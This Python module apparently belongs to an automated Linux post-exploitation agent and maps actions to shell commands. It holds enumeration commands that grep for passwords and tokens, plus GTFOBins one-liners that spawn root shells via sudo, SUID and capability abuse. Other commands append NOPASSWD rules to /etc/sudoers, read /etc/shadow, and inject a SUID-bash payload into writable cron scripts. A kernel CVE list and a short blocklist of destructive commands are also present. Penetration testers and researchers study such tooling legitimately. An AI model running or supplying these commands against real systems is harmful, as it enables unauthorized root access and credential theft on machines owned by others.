"""
Action-to-command mapping with safety checks for live execution mode.

Enumeration actions have static command lists.
Exploit actions are generated dynamically via build_exploit_commands()
based on what parsers discovered — so the operator sees real, contextual
GTFOBins one-liners rather than a re-run of the enumeration command.
"""
from __future__ import annotations

import re
from typing import Dict, List, Optional

from postex_agent.core.actions import Action
from postex_agent.core.state import HostState


# ── Static enumeration commands ───────────────────────────────────────────────

_ENUM_COMMANDS: Dict[Action, List[str]] = {
    Action.IDENTIFY_OS: [
        "uname -a",
        "cat /etc/os-release 2>/dev/null",
        "cat /proc/1/cgroup 2>/dev/null | head -n 20",
        "test -f /.dockerenv && echo container:docker",
    ],
    Action.IDENTIFY_USER: [
        "id",
        "whoami",
    ],
    Action.CHECK_SUDO: [
        "sudo -l 2>/dev/null",
    ],
    Action.CHECK_SUID: [
        "find / -perm -4000 -type f 2>/dev/null",
    ],
    Action.CHECK_CAPABILITIES: [
        "getcap -r / 2>/dev/null",
    ],
    Action.CHECK_WRITABLE: [
        "find / -xdev -type d -perm -0002 2>/dev/null | head -n 200",
    ],
    Action.CHECK_CRON: [
        "cat /etc/crontab 2>/dev/null",
        "ls -la /etc/cron* 2>/dev/null",
        "crontab -l 2>/dev/null",
    ],
    Action.SEARCH_CREDENTIALS: [
        "env | grep -iE 'pass|token|key|secret' 2>/dev/null",
        "grep -RniE 'password|passwd|token|secret|apikey' /etc /opt /home 2>/dev/null | head -n 200",
    ],
    Action.CHECK_KERNEL: [
        "uname -r",
        "cat /proc/version 2>/dev/null",
    ],
    Action.VERIFY_ROOT: [
        "id",
        "whoami",
    ],
    Action.STOP: [],
}


# ── GTFOBins one-liner tables ─────────────────────────────────────────────────
# $BINARY is substituted with the full discovered path at runtime.

_SUDO_GTFOBINS: Dict[str, List[str]] = {
    "find":    ["sudo $BINARY . -exec /bin/sh \\; -quit"],
    "vim":     ["sudo $BINARY -c ':!/bin/sh'"],
    "vi":      ["sudo $BINARY -c ':!/bin/sh'"],
    "python":  ["sudo $BINARY -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"],
    "python3": ["sudo $BINARY -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"],
    "perl":    ["sudo $BINARY -e 'exec \"/bin/sh\";'"],
    "ruby":    ["sudo $BINARY -e 'exec \"/bin/sh\"'"],
    "lua":     ["sudo $BINARY -e 'os.execute(\"/bin/sh\")'"],
    "awk":     ["sudo $BINARY 'BEGIN {system(\"/bin/sh\")}'"],
    "nmap":    ["echo 'os.execute(\"/bin/sh\")' > /tmp/_nmap.lua && sudo $BINARY --script=/tmp/_nmap.lua"],
    "less":    ["sudo $BINARY /etc/profile  # then type: !/bin/sh"],
    "more":    ["sudo $BINARY /etc/profile  # then type: !/bin/sh"],
    "man":     ["sudo $BINARY man           # then type: !/bin/sh"],
    "bash":    ["sudo $BINARY -p"],
    "sh":      ["sudo $BINARY -p"],
    "dash":    ["sudo $BINARY -p"],
    "zsh":     ["sudo $BINARY -p"],
    "tar":     ["sudo $BINARY -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"],
    "env":     ["sudo $BINARY /bin/sh"],
    "tee":     ["echo '$USER ALL=(ALL) NOPASSWD:ALL' | sudo $BINARY -a /etc/sudoers"],
    "cp":      ["sudo $BINARY /bin/sh /tmp/sh && sudo chmod +s /tmp/sh && /tmp/sh -p"],
    "node":    ["sudo $BINARY -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"],
    "php":     ["sudo $BINARY -r 'system(\"/bin/sh\");'"],
    "mysql":   ["sudo $BINARY -e '\\! /bin/sh'"],
    "docker":  ["sudo $BINARY run -v /:/mnt --rm -it alpine chroot /mnt sh"],
    "git":     ["sudo $BINARY -p help config  # then type: !/bin/sh"],
    "strace":  ["sudo $BINARY -o /dev/null /bin/sh"],
    "socat":   ["sudo $BINARY stdin exec:/bin/sh"],
    "xargs":   ["sudo $BINARY -a /dev/null sh"],
    "pkexec":  ["sudo $BINARY /bin/sh"],
}

_SUID_GTFOBINS: Dict[str, List[str]] = {
    "find":    ["$BINARY . -exec /bin/sh -p \\; -quit"],
    "vim":     ["$BINARY -c ':py3 import os,pty; os.setuid(0); pty.spawn(\"/bin/bash\")'"],
    "vi":      ["$BINARY -c ':py3 import os,pty; os.setuid(0); pty.spawn(\"/bin/bash\")'"],
    "python":  ["$BINARY -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"],
    "python3": ["$BINARY -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"],
    "perl":    ["$BINARY -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/sh\";'"],
    "ruby":    ["$BINARY -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'"],
    "bash":    ["$BINARY -p"],
    "sh":      ["$BINARY -p"],
    "dash":    ["$BINARY -p"],
    "awk":     ["$BINARY 'BEGIN {setuid(0); system(\"/bin/sh\")}'"],
    "nmap":    ["$BINARY --interactive  # then type: !sh"],
    "env":     ["$BINARY /bin/sh -p"],
    "tar":     ["$BINARY -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"],
    "cp":      ["$BINARY /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p"],
    "node":    ["$BINARY -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'"],
    "php":     ["$BINARY -r 'posix_setuid(0); system(\"/bin/sh\");'"],
    "pkexec":  ["# CVE-2021-4034 (PwnKit): https://github.com/berdav/CVE-2021-4034"],
    "strace":  ["$BINARY -o /dev/null /bin/sh -p"],
    "tee":     ["echo '$USER ALL=(ALL) NOPASSWD:ALL' | $BINARY -a /etc/sudoers"],
    "socat":   ["$BINARY stdin exec:/bin/sh,pty,stderr,setsid,sigint,sane"],
}

_CAP_GTFOBINS: Dict[str, List[str]] = {
    "python":  ["$BINARY -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"],
    "python3": ["$BINARY -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"],
    "perl":    ["$BINARY -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";'"],
    "ruby":    ["$BINARY -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'"],
    "node":    ["$BINARY -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\",{stdio:[0,1,2]})'"],
    "php":     ["$BINARY -r 'posix_setuid(0); system(\"/bin/bash\");'"],
    "vim":     ["$BINARY -c ':py3 import os,pty; os.setuid(0); pty.spawn(\"/bin/bash\")'"],
    "tar":     ["$BINARY xf /etc/shadow /tmp/ 2>/dev/null && cat /tmp/shadow"],
}


def _normalise_name(path: str) -> str:
    """
    /usr/bin/python3.9  ->  python3
    /usr/bin/python2.7  ->  python
    /usr/bin/vim.basic  ->  vim
    """
    name = path.split("/")[-1].lower()
    name = re.sub(r"\.\d+$", "", name)        # strip trailing .9 / .7
    name = re.sub(r"(\d)\.\d+$", r"\1", name) # strip 3.9 -> 3
    return name


def _resolve_gtfobins(paths: List[str], table: Dict[str, List[str]]) -> List[str]:
    """
    For each binary path, look up its GTFOBins commands and substitute $BINARY.
    Returns a deduplicated flat list.
    """
    cmds: List[str] = []
    seen: set = set()
    for path in paths:
        raw   = path.split("/")[-1].lower()
        norm  = _normalise_name(path)
        for name in dict.fromkeys([raw, norm]):   # try raw first, then normalised
            if name in table:
                for template in table[name]:
                    cmd = template.replace("$BINARY", path)
                    if cmd not in seen:
                        seen.add(cmd)
                        cmds.append(cmd)
                break
    return cmds


def _extract_sudo_paths(sudo_commands: List[str]) -> List[str]:
    """Pull absolute binary paths out of sudo -l output lines."""
    paths: List[str] = []
    for entry in sudo_commands:
        # Entry looks like: "(ALL : ALL) NOPASSWD: /usr/bin/find /usr/bin/vim"
        cmd_part = entry.split(":")[-1].strip()
        for token in cmd_part.split():
            token = token.strip().rstrip(",")
            if token.startswith("/") and token not in paths:
                paths.append(token)
    return paths


def build_exploit_commands(action: Action, state: HostState) -> List[str]:
    """Generate contextual exploit commands from what parsers discovered."""

    if action == Action.EXPLOIT_SUDO:
        paths = _extract_sudo_paths(state.sudo_commands)
        cmds  = _resolve_gtfobins(paths, _SUDO_GTFOBINS)
        if not cmds:
            cmds = [
                "sudo -l  # review manually — no known GTFOBins match",
                "# If (ALL) or (ALL : ALL) with NOPASSWD, try: sudo /bin/bash -p",
            ]
        return cmds

    if action == Action.EXPLOIT_SUID:
        cmds = _resolve_gtfobins(state.exploitable_suid_bins, _SUID_GTFOBINS)
        if not cmds and state.exploitable_suid_bins:
            cmds = [f"# Investigate SUID binary: {b}" for b in state.exploitable_suid_bins[:5]]
        elif not cmds:
            cmds = ["find / -perm -4000 -type f 2>/dev/null  # re-enumerate, nothing matched"]
        return cmds

    if action == Action.EXPLOIT_CAP:
        cmds = _resolve_gtfobins(state.exploitable_caps, _CAP_GTFOBINS)
        if not cmds and state.exploitable_caps:
            cmds  = [f"# Binary with cap_setuid/cap_setgid: {b}" for b in state.exploitable_caps[:5]]
            cmds += ["# Generic: <binary> -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"]
        elif not cmds:
            cmds = ["getcap -r / 2>/dev/null  # re-enumerate capabilities"]
        return cmds

    if action == Action.EXPLOIT_CRON:
        cmds: List[str] = []
        for job in state.cron_jobs[:10]:
            parts = job.split()
            if len(parts) < 6:
                continue
            # crontab format: min hour dom mon dow [user] command
            # detect user field: 7+ parts where parts[5] is not a path
            has_user = len(parts) >= 7 and not parts[5].startswith("/")
            script   = parts[6] if has_user else parts[5]
            if script.startswith("/") and any(
                script.endswith(ext) for ext in (".sh", ".py", ".pl", ".rb", ".php")
            ):
                cmds.append(f"ls -la {script}  # check if writable")
                cmds.append(
                    f"echo 'cp /bin/bash /tmp/privesc && chmod +s /tmp/privesc' >> {script}"
                    f"  # inject payload, wait for cron, then run: /tmp/privesc -p"
                )
        if not cmds:
            cmds = [
                "cat /etc/crontab && crontab -l 2>/dev/null",
                "ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null",
                "# Find root-owned scripts in cron that you can write to, then inject a payload",
            ]
        return cmds

    if action == Action.EXPLOIT_KERNEL:
        version = state.kernel_version or "unknown"
        major   = version.split("-")[0]
        return [
            f"# Kernel version: {version}",
            f"searchsploit linux kernel {major}  # run on attacker machine",
            "# High-priority CVEs to check:",
            "#   CVE-2022-0847 (Dirty Pipe)       kernels 5.8 – 5.16.11",
            "#   CVE-2016-5195 (Dirty COW)        kernels 2.6.22 – 4.8.3",
            "#   CVE-2021-4034 (PwnKit / pkexec)  most distros pre Jan 2022",
            "#   CVE-2021-3156 (sudo heap bof)    sudo < 1.9.5p2",
            "#   CVE-2022-2588 (route4 UAF)       kernels 5.4 – 5.19",
            "uname -r && cat /proc/version",
        ]

    return []


def get_commands(action: Action, state: Optional[HostState] = None) -> List[str]:
    """
    Return the command list for an action.

    For enumeration actions, returns the static list.
    For exploit actions, pass `state` to get contextual one-liners based on
    what the parsers discovered.  If state is None, returns a placeholder
    reminding the operator to enumerate first.
    """
    if action in _ENUM_COMMANDS:
        return list(_ENUM_COMMANDS[action])

    # Exploit actions
    if state is not None:
        return build_exploit_commands(action, state)

    # No state provided — informational fallback
    _PLACEHOLDERS: Dict[Action, List[str]] = {
        Action.EXPLOIT_SUDO:   ["# Run CHECK_SUDO first, then re-select EXPLOIT_SUDO"],
        Action.EXPLOIT_SUID:   ["# Run CHECK_SUID first, then re-select EXPLOIT_SUID"],
        Action.EXPLOIT_CAP:    ["# Run CHECK_CAPABILITIES first, then re-select EXPLOIT_CAP"],
        Action.EXPLOIT_CRON:   ["# Run CHECK_CRON first, then re-select EXPLOIT_CRON"],
        Action.EXPLOIT_KERNEL: ["# Run CHECK_KERNEL first, then re-select EXPLOIT_KERNEL"],
    }
    return _PLACEHOLDERS.get(action, [])


# ── Safety blocklist ──────────────────────────────────────────────────────────

_BLOCKLIST_PATTERNS: List[str] = [
    r"\brm\s+-rf\b",
    r"\bmkfs(?:\.\w+)?\b",
    r"\bshutdown\b",
    r"\breboot\b",
    r"\bpoweroff\b",
    r"\bhalt\b",
    r"\binit\s+[06]\b",
    r"\bdd\s+if=",
    r"\bchmod\s+777\s+/\b",
    r">\s*/dev/sd[a-z]",
    r"\bwipefs\b",
]

_BLOCKLIST_RE = [re.compile(pat, re.IGNORECASE) for pat in _BLOCKLIST_PATTERNS]


def is_safe_command(command: str) -> bool:
    cmd = command.strip()
    if not cmd:
        return False
    for pattern in _BLOCKLIST_RE:
        if pattern.search(cmd):
            return False
    return True
